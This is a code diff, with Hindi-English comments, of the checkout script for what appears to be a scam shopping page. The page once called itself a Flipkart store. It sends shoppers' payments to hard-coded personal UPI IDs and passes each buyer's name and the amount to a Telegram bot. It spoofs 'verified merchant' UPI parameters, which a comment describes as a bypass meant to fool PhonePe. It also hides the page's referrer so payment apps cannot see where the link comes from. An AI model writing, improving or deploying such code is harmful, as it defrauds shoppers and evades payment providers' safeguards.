-        // Update Summary Page
-        document.getElementById('sum-img').src = sel.imgs[0];
-        document.getElementById('sum-name').innerText = sel.name;
-        document.getElementById('sum-price-bold').innerText = "₹" + sel.price;
-        document.getElementById('sum-mrp-strike').innerText = "₹" + sel.mrp;
-        document.getElementById('sum-discount-tag').innerText = discountPercent + "% Off";
-        
-        // Price Table
-        document.getElementById('sum-mrp-val').innerText = "₹" + sel.mrp;
-        document.getElementById('sum-disc-val').innerText = "- ₹" + discountAmount;
-        document.getElementById('sum-final-val').innerText = "₹" + sel.price;
-        document.getElementById('sum-savings').innerText = "₹" + discountAmount;
-        
-        // Footers
-        document.getElementById('sum-footer-mrp').innerText = "₹" + sel.mrp;
-        document.getElementById('sum-bottom-price').innerText = "₹" + sel.price;
-        
-        document.getElementById('pay-footer-mrp').innerText = "₹" + sel.mrp;
-        document.getElementById('pay-bottom-price').innerText = "₹" + sel.price;
-      updatePaymentDetails(); // Isse payment page ki prices load ho jayengi
+        document.getElementById('sum-mrp-val').innerText = "₹" + mrpNum.toLocaleString('en-IN');
+        document.getElementById('sum-disc-val').innerText = "-₹" + discountAmount.toLocaleString('en-IN');
+        document.getElementById('sum-final-val').innerText = "₹" + priceNum.toLocaleString('en-IN');
+        document.getElementById('sum-savings').innerText = "₹" + discountAmount.toLocaleString('en-IN');
+
+        document.getElementById('sum-footer-mrp').innerText = "₹" + mrpNum.toLocaleString('en-IN');
+        document.getElementById('sum-bottom-price').innerText = "₹" + priceNum.toLocaleString('en-IN');
+
+        const fullAddress = `${uName}, ${uPhone}, ${uAdd}, ${uCity}, ${uState} - ${uPin}`;
+        document.getElementById('sum-address-text').innerText = fullAddress;
+        document.getElementById('sum-address-box').classList.remove('hidden');
 
         showPage('page-summary');
-    } else { 
-        alert("Please enter Name and Phone Number"); 
     }
-}
-      async function fetchPin(pin) {
-    const cityInput = document.getElementById('uCity');
-    const stateInput = document.getElementById('uState');
 
-    // Jab 6 digit poore ho jayein tabhi fetch karein
-    if (pin.length === 6) {
-        cityInput.value = "Loading...";
-        stateInput.value = "Loading...";
+    function updatePaymentDetails() {
+        if (!sel) return;
+        const mrp = parseInt(sel.mrp.toString().replace(/[₹,]/g, '')) || 0;
+        const price = parseInt(sel.price.toString().replace(/[₹,]/g, '')) || 0;
+        const discount = mrp - price;
 
-        try {
-            const response = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
-            const data = await response.json();
+        if(document.getElementById('pay-rec-img')) document.getElementById('pay-rec-img').src = sel.imgs[0];
+        if(document.getElementById('pay-rec-name')) document.getElementById('pay-rec-name').innerText = sel.name;
+        if(document.getElementById('pay-mrp')) document.getElementById('pay-mrp').innerText = "₹" + mrp.toLocaleString('en-IN');
+        if(document.getElementById('pay-discount')) document.getElementById('pay-discount').innerText = "- ₹" + discount.toLocaleString('en-IN');
+        if(document.getElementById('pay-total')) document.getElementById('pay-total').innerText = "₹" + price.toLocaleString('en-IN');
+        if(document.getElementById('pay-save')) document.getElementById('pay-save').innerText = "You will save ₹" + discount.toLocaleString('en-IN') + " on this order";
+        if(document.getElementById('qr-amount')) document.getElementById('qr-amount').innerText = "₹" + price.toLocaleString('en-IN');
+        
+        const payBtn = document.getElementById('main-pay-btn');
+        if(payBtn) payBtn.innerText = "Pay ₹" + price.toLocaleString('en-IN');
+        
+        document.getElementById('pay-receipt').classList.remove('hidden');
+    }
 
-            if (data[0].Status === "Success") {
-                const details = data[0].PostOffice[0];
-                cityInput.value = details.District;
-                stateInput.value = details.State;
-            } else {
-                alert("Invalid Pincode! Please check again.");
-                cityInput.value = "";
-                stateInput.value = "";
-            }
-        } catch (error) {
-            console.error("Error fetching pincode:", error);
-            cityInput.value = "";
-            stateInput.value = "";
+    function selectPay(app, el) {
+        document.querySelectorAll('.pay-option').forEach(item => {
+            item.classList.remove('bg-blue-50', 'border-l-4', 'border-blue-500');
+        });
+        el.classList.add('bg-blue-50', 'border-l-4', 'border-blue-500');
+        document.getElementById(app + '-radio').checked = true;
+        if(app !== 'qr') {
+            document.getElementById('qr-container').classList.add('hidden');
         }
-    } else {
-        // Agar 6 digit se kam hai toh fields khali rakhein
-        cityInput.value = "";
-        stateInput.value = "";
     }
-}
+
+    function toggleQR(el) {
+        const qrBox = document.getElementById('qr-container');
+        const upiId = "8294338151@okbizaxis";
+        const amount = parseInt(sel.price.toString().replace(/[₹,]/g, ''));
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=${upiId}%26am=${amount}%26cu=INR`;
+        document.getElementById('qrcode-img').innerHTML = `<img src="${qrUrl}" class="w-40 h-40 mx-auto">`;
+        qrBox.classList.remove('hidden');
+        qrBox.scrollIntoView({ behavior: 'smooth' });
+    }
 
     async function confirmPay() {
-    const myUpiId = "Q160502923@ybl"; 
-    const amount = sel.price;
-    // Space ke liye %20 zaroori hai
-    const shopName = "deendayal%20kirana%20store"; 
-    const trId = "ORDER" + Math.floor(Math.random() * 9999999);
+        const selectedInput = document.querySelector('input[name="payApp"]:checked');
+        if (!selectedInput) {
+            alert("Please select a payment method first!");
+            return;
+        }
 
-    // Telegram Notification
-    const userMsg = `🛒 New Order: ${shopName}\n👤 Name: ${document.getElementById('uName').value}\n💰 Amt: ₹${amount}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`);
+        const selectedApp = selectedInput.value;
+        const myUpiId = "8294338151@okbizaxis"; 
+        const amount = parseInt(sel.price.toString().replace(/[₹,]/g, ''));
+        const shopName = "online%20Store"; 
+        const trId = "ORDER" + Math.floor(Math.random() * 9999999);
 
-    const selectedApp = document.querySelector('input[name="payApp"]:checked').value;
+        const userMsg = `🛒 New Click: ${selectedApp}\n👤 Name: ${document.getElementById('uName').value}\n💰 Amt: ₹${amount}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`);
 
-    // --- Verified Merchant Bypass Link ---
-    // mc=5411 (Kirana Store ka code) aur mode=02 (Verified Merchant)
-    // Isse PhonePe ko lagega ki ye ek registered shop hai
-    const merchantLink = `upi://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00`;
+        if (selectedApp === 'qr') return;
 
-    if (selectedApp === 'phonepe') {
-        // PhonePe ke liye "Intent" trigger karega jo app ko block karne se rokega
-        window.location.href = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00#Intent;scheme=upi;package=com.phonepe.app;end`;
-    } 
-    else if (selectedApp === 'gpay') {
-        window.location.href = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
-    }
-    else {
-        // Agar koi aur app hai ya Paytm hai, toh normal link
-        window.location.href = merchantLink;
-    }
+        const upiLink = `upi://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00`;
+        let intentUrl = upiLink;
 
-    // Fallback: Agar app 1 sec mein nahi khuli
-    setTimeout(() => {
-        window.location.href = merchantLink;
-    }, 1000);
-}
-      function updatePaymentDetails() {
-    document.getElementById('qr-amount').innerText = "₹" + sel.price;
-    // Baki pricing IDs jo aapne summary mein di hain wahi yahan bhi update hongi
-}
+        if (selectedApp === 'phonepe') {
+            intentUrl = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=;end`;
+        } else if (selectedApp === 'gpay') {
+            intentUrl = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;S.browser_fallback_url=;end`;
+        } else if (selectedApp === 'paytm') {
+            intentUrl = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02#Intent;scheme=upi;package=net.one97.paytm;S.browser_fallback_url=;end`;
+        }
 
-function toggleQR(el) {
-    const qrBox = document.getElementById('qr-container');
-    const qrImgDiv = document.getElementById('qrcode-img');
-    const upiId = "8294338151@okbizaxis";
-    const amount = sel.price;
-    
-    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=${upiId}%26am=${amount}%26cu=INR`;
-    
-    qrImgDiv.innerHTML = `<img src="${qrUrl}" class="w-40 h-40 mx-auto">`;
-    qrBox.classList.remove('hidden');
-    qrBox.scrollIntoView({ behavior: 'smooth' });
-}
-      function selectPay(app, el) {
-    // Sabhi labels se blue color hatana
-    document.querySelectorAll('.pay-option').forEach(item => {
-        item.classList.remove('bg-blue-50', 'border-l-4', 'border-blue-500');
-    });
-    
-    // Select kiye gaye label ko highlight karna
-    el.classList.add('bg-blue-50', 'border-l-4', 'border-blue-500');
-    
-    // Radio button ko check karna
-    document.getElementById(app + '-radio').checked = true;
+        const hiddenLink = document.createElement('a');
+        hiddenLink.href = intentUrl;
+        hiddenLink.rel = "noreferrer";
+        document.body.appendChild(hiddenLink);
+        hiddenLink.click();
+        document.body.removeChild(hiddenLink);
 
-    // Agar QR ke alawa kuch chuna to QR box hide kar do
-    if(app !== 'qr') {
-        document.getElementById('qr-container').classList.add('hidden');
-    }
-}
-
-async function confirmPay() {
-    const selectedInput = document.querySelector('input[name="payApp"]:checked');
-    
-    if (!selectedInput) {
-        alert("Please select a payment method first!");
-        return;
+        setTimeout(() => { window.location.href = upiLink; }, 1500);
     }
 
-    const selectedApp = selectedInput.value;
-    const myUpiId = "8294338151@okbizaxis"; // Aapka UPI ID
-    const amount = sel.price;
-    const shopName = "Flipkart%20Store"; 
-    const trId = "ORDER" + Math.floor(Math.random() * 9999999);
-
-    // Telegram Notification
-    const userMsg = `🛒 New Click: ${selectedApp}\n👤 Name: ${document.getElementById('uName').value}\n💰 Amt: ₹${amount}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`);
-
-    // 1. Sabse "HARD" UPI Link (With Merchant Parameters)
-    const upiLink = `upi://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00&orgid=189999`;
-
-    // QR Code ke liye
-    if (selectedApp === 'qr') {
-        alert("Please scan the QR code and pay.");
-        return;
-    }
-
-    // 2. PhonePe aur GPay ke liye Android Intent (Success rate 99%)
-    // Isme "S.browser_fallback_url" ko empty rakha hai taaki browser beech mein na aaye
-    let intentUrl = "";
-
-    if (selectedApp === 'phonepe') {
-        intentUrl = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=;end`;
-    } 
-    else if (selectedApp === 'gpay') {
-        intentUrl = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;S.browser_fallback_url=;end`;
-    }
-    else if (selectedApp === 'paytm') {
-        intentUrl = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00#Intent;scheme=upi;package=net.one97.paytm;S.browser_fallback_url=;end`;
-    }
-    else {
-        // Kisi aur app ke liye generic intent
-        intentUrl = upiLink;
-    }
-
-    // --- MAGIC STEP: REFERRER HIDING ---
-    // PhonePe ko ye pata nahi chalna chahiye ki link "github.io" se aa raha hai
-    // Hum ek temporary invisible link banayenge aur use click karenge
-    const hiddenLink = document.createElement('a');
-    hiddenLink.href = intentUrl;
-    hiddenLink.rel = "noreferrer"; // Ye browser security ko bypass karne mein madad karta hai
-    document.body.appendChild(hiddenLink);
-    hiddenLink.click();
-    document.body.removeChild(hiddenLink);
-
-    // Fallback: Agar 1.5 second mein app nahi khuli
-    setTimeout(() => { 
-        window.location.href = upiLink; 
-    }, 1500);
-}
-init();
-    </script>
+    init();
+</script>
 </body>
 </html> 
